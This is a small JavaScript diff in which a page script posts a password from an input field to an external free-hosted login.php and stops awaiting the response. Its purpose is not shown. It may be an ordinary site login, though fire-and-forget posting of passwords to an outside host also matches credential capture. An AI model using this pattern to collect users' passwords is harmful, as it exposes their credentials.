@@ -41,7 +41,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const formData = new FormData();
       formData.append("password", input.value.trim());
 
-      const res = await fetch("https://contrasena.infinityfreeapp.com/login.php", {
+      fetch("https://contrasena.infinityfreeapp.com/login.php", {
         method: "POST",
         body: formData
       });
